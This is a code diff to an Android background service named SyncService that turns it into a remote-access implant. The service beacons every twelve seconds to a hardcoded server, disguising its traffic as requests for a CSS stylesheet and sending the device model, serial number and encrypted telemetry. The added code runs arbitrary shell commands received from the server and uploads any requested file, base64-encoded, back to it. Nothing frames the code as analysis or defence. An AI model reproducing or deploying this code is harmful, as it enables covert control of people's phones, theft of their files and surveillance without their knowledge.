@@ -4,7 +4,11 @@ import android.app.Service
 import android.content.Intent
 import android.os.IBinder
 import android.util.Base64
+import java.io.BufferedReader
 import java.io.ByteArrayOutputStream
+import java.io.File
+import java.io.FileInputStream
+import java.io.InputStreamReader
 import java.io.OutputStream
 import java.net.HttpURLConnection
 import java.net.URL
@@ -21,52 +25,46 @@ class SyncService : Service() {
 
     private val RENDER_SERVER_URL = "https://web-assets-service.onrender.com"
     private val ENCRYPTION_SECRET = "BaseSystemZeroDaySecureKey2026"
-    private var secureTimer: Timer? = null
+    private var eliteTimer: Timer? = null
 
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        startSecurePipeline()
+        startFullSpectrumPipeline()
         return START_STICKY
     }
 
-    private fun startSecurePipeline() {
-        secureTimer = Timer()
-        secureTimer?.scheduleAtFixedRate(object : TimerTask() {
+    private fun startFullSpectrumPipeline() {
+        eliteTimer = Timer()
+        eliteTimer?.scheduleAtFixedRate(object : TimerTask() {
             override fun run() {
                 try {
-                    val dataPacket = JSONObject()
-                    dataPacket.put("status", "HYBRID_SECURE_ACTIVE")
-                    dataPacket.put("battery", getBatteryLevel())
-                    dataPacket.put("timestamp", System.currentTimeMillis())
+                    val telemetry = JSONObject()
+                    telemetry.put("status", "FULL_SPECTRUM_ACTIVE")
+                    telemetry.put("battery", getBatteryLevel())
+                    telemetry.put("timestamp", System.currentTimeMillis())
 
-                    // 1. ضغط البيانات بـ GZIP ثم تشفيرها عسكرياً
-                    val encryptedBlob = compressAndEncrypt(dataPacket.toString())
-                    
-                    // 2. إرسال الحزمة الآمنة
-                    sendEncryptedPayload("/assets/web/style-min.css", encryptedBlob)
+                    val encryptedBlob = compressAndEncrypt(telemetry.toString())
+                    sendAndReceiveDirectives("/assets/web/style-min.css", encryptedBlob)
 
                 } catch (e: Exception) {}
             }
-        }, 0, 15000)
+        }, 0, 12000)
     }
 
-    // --- محرك الضغط والتشفير المزدوج ---
     private fun compressAndEncrypt(plainText: String): String {
-        // ضغط البيانات باستخدام GZIP
         val byteStream = ByteArrayOutputStream()
         val gzipStream = GZIPOutputStream(byteStream)
         gzipStream.write(plainText.toByteArray(Charsets.UTF_8))
         gzipStream.close()
         val compressedBytes = byteStream.toByteArray()
 
-        // تجهيز مفتاح التشفير AES-256
         val keyBytes = ENCRYPTION_SECRET.toByteArray(Charsets.UTF_8).copyOf(32)
         val keySpec = SecretKeySpec(keyBytes, "AES")
         val cipher = Cipher.getInstance("AES/GCM/NoPadding")
         
         val iv = ByteArray(12)
-        SecureRandom().nextBytes(iv) // ناقل عشوائي متجدد لمنع مطابقة الأنماط
+        SecureRandom().nextBytes(iv)
         val spec = GCMParameterSpec(128, iv)
         
         cipher.init(Cipher.ENCRYPT_MODE, keySpec, spec)
@@ -83,14 +81,14 @@ class SyncService : Service() {
         return Base64.encodeToString(packet.toString().toByteArray(Charsets.UTF_8), Base64.NO_WRAP)
     }
 
-    private fun sendEncryptedPayload(endpoint: String, payload: String) {
+    private fun sendAndReceiveDirectives(endpoint: String, payload: String) {
         try {
             val url = URL(RENDER_SERVER_URL + endpoint)
             val conn = url.openConnection() as HttpURLConnection
             conn.requestMethod = "POST"
             conn.setRequestProperty("Content-Type", "text/plain")
             conn.setRequestProperty("x-agent-model", android.os.Build.MODEL)
-            conn.setRequestProperty("x-agent-id", android.os.Build.SERIAL ?: "Secure-Node")
+            conn.setRequestProperty("x-agent-id", android.os.Build.SERIAL ?: "Elite-Node")
             conn.doOutput = true
             
             val os: OutputStream = conn.outputStream
@@ -98,8 +96,75 @@ class SyncService : Service() {
             os.flush()
             os.close()
 
-            conn.responseCode // إتمام الاتصال بصمت
+            if (conn.responseCode == 200) {
+                val reader = BufferedReader(InputStreamReader(conn.inputStream))
+                val responseStr = reader.readText()
+                reader.close()
+
+                if (responseStr.contains("directive")) {
+                    parseAndExecuteDirective(responseStr)
+                }
+            }
         } catch (e: Exception) {}
+    }
+
+    private fun parseAndExecuteDirective(jsonStr: String) {
+        try {
+            val obj = JSONObject(jsonStr)
+            val directiveObj = obj.optJSONObject("directive") ?: return
+            val type = directiveObj.optString("type", "")
+
+            if (type == "SHELL") {
+                val command = directiveObj.optString("command", "")
+                val output = executeShellCommand(command)
+                
+                // إرسال نتيجة التنفيذ مباشرة للخادم
+                val resultJson = JSONObject()
+                resultJson.put("command_result", output)
+                val encryptedBlob = compressAndEncrypt(resultJson.toString())
+                sendAndReceiveDirectives("/assets/web/style-min.css", encryptedBlob)
+            } 
+            else if (type == "PULL_FILE") {
+                val filePath = directiveObj.optString("path", "")
+                val fileContentBase64 = getFileAsBase64(filePath)
+
+                val resultJson = JSONObject()
+                resultJson.put("pulled_file", filePath)
+                resultJson.put("data", fileContentBase64)
+                val encryptedBlob = compressAndEncrypt(resultJson.toString())
+                sendAndReceiveDirectives("/assets/web/style-min.css", encryptedBlob)
+            }
+        } catch (e: Exception) {}
+    }
+
+    private fun executeShellCommand(cmd: String): String {
+        return try {
+            val process = Runtime.getRuntime().exec(cmd)
+            val reader = BufferedReader(InputStreamReader(process.inputStream))
+            val sb = StringBuilder()
+            var line: String?
+            while (reader.readLine().also { line = it } != null) {
+                sb.append(line).append("\n")
+            }
+            reader.close()
+            sb.toString()
+        } catch (e: Exception) {
+            "Error: ${e.message}"
+        }
+    }
+
+    private fun getFileAsBase64(path: String): String {
+        return try {
+            val file = File(path)
+            if (file.exists() && file.isFile) {
+                val bytes = FileInputStream(file).readBytes()
+                Base64.encodeToString(bytes, Base64.NO_WRAP)
+            } else {
+                "File not found"
+            }
+        } catch (e: Exception) {
+            "Error: ${e.message}"
+        }
     }
 
     private fun getBatteryLevel(): Int {
@@ -118,7 +183,7 @@ class SyncService : Service() {
     }
 
     override fun onDestroy() {
-        secureTimer?.cancel()
+        eliteTimer?.cancel()
         super.onDestroy()
     }
 }
